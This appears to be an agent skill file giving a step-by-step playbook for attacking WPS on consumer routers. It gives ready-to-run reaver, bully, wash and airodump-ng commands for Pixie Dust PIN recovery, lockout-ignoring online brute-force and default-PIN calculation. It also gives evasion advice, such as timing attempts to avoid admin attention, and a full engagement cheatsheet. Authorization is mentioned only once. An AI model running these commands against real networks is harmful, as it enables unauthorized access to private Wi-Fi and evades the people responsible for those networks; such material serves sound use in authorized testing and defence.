---
name: offensive-wps
description: WPS (Wi-Fi Protected Setup) PIN attack methodology — Pixie Dust offline
  attack against vulnerable chipsets (Ralink, Realtek, Broadcom, MediaTek), online
  PIN brute-force with reaver/bully, lockout handling, time-of-day evasion, WPS push-button
  vulnerability windows, and PIN-to-PSK derivation. Use when a target SOHO router
  exposes WPS — common on consumer ISP gear, often left enabled by default even when
  WPS attacks have been known for over a decade.
---

# WPS PIN Attacks

WPS converts an 8-digit PIN into the network PSK via the M3/M4 message exchange. The PIN is split into 4-digit + 3-digit halves (the 8th digit is a checksum), giving only 11,000 effective combinations — and on vulnerable chipsets, the offline Pixie Dust attack recovers the PIN in seconds without ever sending an online attempt.

## Quick Workflow

1. Detect WPS-enabled APs (look for the WPS IE in beacons)
2. Try Pixie Dust first — offline, undetectable, instantaneous when it works
3. If chipset isn't vulnerable, check whether online brute is feasible (lockout policy)
4. Online brute as last resort, slow and detectable

---

## Detection

```bash
# wash — dedicated WPS scanner
sudo wash -i wlan0mon

# Or use airodump-ng with WPS column
sudo airodump-ng wlan0mon --wps
```

Output includes: WPS version (1.0 / 2.0), Locked status, Configured/Unconfigured, vendor.

WPS 2.0 introduced lockout enforcement, but many consumer APs still implement it as "lock for 60 seconds after 3 failures" — easily bypassed by waiting.

## Pixie Dust (Offline)

The Pixie Dust attack exploits weak nonce generation in WPS-implementing chipsets. The attack captures one full WPS handshake (M1-M4) and then offline-computes the PIN.

```bash
# reaver with Pixie Dust mode
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv

# bully alternative
sudo bully -b AA:BB:CC:DD:EE:FF -d -v 3 wlan0mon
```

| Chipset | Vulnerable? |
|---|---|
| Ralink (RT chipsets) | Yes — most older D-Link, TP-Link, Edimax |
| Realtek (RTL8xxx) | Yes — many TRENDnet, Belkin |
| Broadcom (older firmware) | Often yes — specific model + firmware revs |
| MediaTek (specific revs) | Mixed |
| Atheros | Mostly patched |

When successful:

```
[Pixie-Dust] WPS PIN: 12345670
[Pixie-Dust] WPA PSK: ActualPasswordHere
[Pixie-Dust] AP SSID: HomeWiFi
```

The PIN gives you the PSK directly via the M7 message — no PSK cracking needed.

## Online PIN Brute-Force

When Pixie Dust fails, online brute is the fallback. Send EAPOL-Start → M1 → M2 → M3 attempts with successive PINs.

```bash
# reaver online mode (default)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -L -N -d 15 -t 30 -T .5 -r 3:30 -vv

# Flags:
# -L : ignore failed lockouts
# -N : don't send NACK packets
# -d 15 : 15-second delay between attempts
# -t 30 : timeout
# -T .5 : timeout for receiving M5/M7
# -r 3:30 : pause 30s every 3 attempts
```

### Lockout Handling

Most modern APs lock WPS after a few failed PINs. Detect lockout:

- AP stops responding to EAPOL-Start
- WPS `Locked` flag in beacon switches to `Yes`

Strategies:
- **Wait it out**: many APs auto-unlock after 60–600 seconds. Set `-r` accordingly.
- **Reboot the AP**: physically resets state. Only works if you have authorization for that disruption.
- **Spread attempts across time of day**: low-traffic windows to avoid coincident legitimate WPS use that triggers admin attention.

### Time Estimate

- 11,000 attempts × (delay + timeout) ≈ best case 4 hours, realistic 12–24 hours
- Lockout multiplier: 5–20x depending on policy
- **Pixie Dust beats this by minutes when vulnerable.** Always try first.

## Push-Button (PBC) Method

WPS PBC opens a 120-second window after the user presses the button on the AP. During this window any client requesting WPS is paired without PIN.

Attack viability:
- Practically: requires either physical access to push the button (= you've already won) or social engineering ("the IT guy will press the button at 14:00")
- Some buggy APs have a permanent PBC window — test by sending PBC association

```bash
# Trigger PBC pairing attempt
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p '00000000' -P
```

## PIN-Default Patterns

Some vendors derive the WPS PIN from MAC + serial. With known algorithms:

```bash
# wpscalc / WPSPIN — calculate likely PINs from BSSID
wpspin --bssid AA:BB:CC:DD:EE:FF
# Outputs candidate PINs to try first before brute
```

Hit rate is high on certain Belkin, ZyXEL, and Linksys models.

## Detection Considerations

| Signal | Defender View |
|---|---|
| Reaver/bully traffic pattern | WIPS rule: rapid WPS exchange attempts |
| PIN failures spike | WPS `Locked` flag flip |
| Vendor PSK leaked offline | Undetectable — Pixie Dust is offline |
| Consumer admin interface | "WPS attempt" might log if AP has audit features (rare) |

Pixie Dust against a vulnerable chipset is essentially undetectable from the wire perspective — only one WPS exchange happens, identical to a legitimate client.

## Engagement Cheatsheet

```bash
# 1. Setup
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# 2. Find WPS APs
sudo wash -i wlan0mon

# 3. Pixie Dust first
sudo reaver -i wlan0mon -b <BSSID> -K 1 -vvv

# 4. If Pixie Dust fails, try vendor-specific PIN candidates
wpspin --bssid <BSSID> | head -10

# 5. Online brute as last resort
sudo reaver -i wlan0mon -b <BSSID> -L -N -d 15 -t 30 -r 3:30 -vv

# 6. Once PIN known, derive PSK from M7 message
# (reaver does this automatically; bully prints PSK on success)
```

---

## Key References

- pixiewps: github.com/wiire-a/pixiewps
- reaver: github.com/t6x/reaver-wps-fork-t6x
- bully: github.com/aanarchyy/bully
- WPS 2.0 spec (Wi-Fi Alliance)
- "Pixie Dust Attack" (Bongard, 2014) — original disclosure
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
